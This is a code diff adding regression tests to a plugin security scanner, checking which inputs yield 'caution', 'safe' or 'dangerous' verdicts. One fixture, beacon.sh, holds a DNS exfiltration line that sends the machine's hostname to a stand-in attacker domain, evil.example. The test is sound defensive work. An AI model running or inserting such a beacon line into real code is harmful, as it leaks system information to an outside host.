@@ -74,6 +74,56 @@ class TestCleanPlugin:
         result = scan_plugin(plugin)
         assert result.verdict == "safe"
 
+    def test_docs_mentioning_agent_config_filenames_are_caution_not_block(self, tmp_path):
+        # Plugin repos routinely ship an AGENTS.md and reference it from the
+        # README ("your agent can read this repo's AGENTS.md"). A prose
+        # mention of the filename is not a config WRITE and must not yield
+        # the unoverridable dangerous verdict (regression: a real plugin was
+        # blocked solely for this).
+        files = dict(BASE_FILES)
+        files["AGENTS.md"] = "# Setup\n\nInstall with `hermes plugins install owner/repo`.\n"
+        files["README.md"] = (
+            "# Test plugin\n\nSee AGENTS.md for full instructions.\n"
+        )
+        plugin = _mk_plugin(tmp_path, files)
+        result = scan_plugin(plugin, source="owner/repo")
+        assert result.verdict == "caution", [
+            (f.pattern_id, f.severity, f.file) for f in result.findings
+        ]
+        # caution still requires confirmation but --force may proceed.
+        allowed, _reason = should_allow_plugin_install(result, force=True)
+        assert allowed is True
+
+    def test_js_template_literal_with_host_is_caution_not_block(self, tmp_path):
+        # dns_exfil targets shell lines like `host $VAR`; JS arrow functions
+        # such as `host => `served on ${host}`` matched by accident (the
+        # parameter binding followed by a template literal) and hard-blocked
+        # installs (regression: real-world desktop plugin). The tightened
+        # pattern must NOT fire on this at all.
+        files = dict(BASE_FILES)
+        files["pane.js"] = (
+            "const strings = {\n"
+            "  tailnet: host => `served on ${host} via Tailscale`,\n"
+            "};\n"
+        )
+        plugin = _mk_plugin(tmp_path, files)
+        result = scan_plugin(plugin, source="owner/repo")
+        assert result.verdict != "dangerous", [
+            (f.pattern_id, f.severity, f.file) for f in result.findings
+        ]
+        assert not any(f.pattern_id == "dns_exfil" for f in result.findings)
+
+    def test_dns_exfil_still_dangerous_in_shell_context(self, tmp_path):
+        # The underlying threat keeps full severity for plugins: a shell
+        # line doing DNS resolution with variable interpolation stays
+        # critical (upstream contract in test_real_dns_exfil_still_flagged).
+        files = dict(BASE_FILES)
+        files["beacon.sh"] = "host $(cat /etc/hostname).evil.example\n"
+        plugin = _mk_plugin(tmp_path, files)
+        result = scan_plugin(plugin)
+        assert result.verdict == "dangerous"
+        assert any(f.pattern_id == "dns_exfil" for f in result.findings)
+
 
 class TestMaliciousPlugin:
     def test_ssh_dir_exfil_in_code_is_flagged(self, tmp_path):
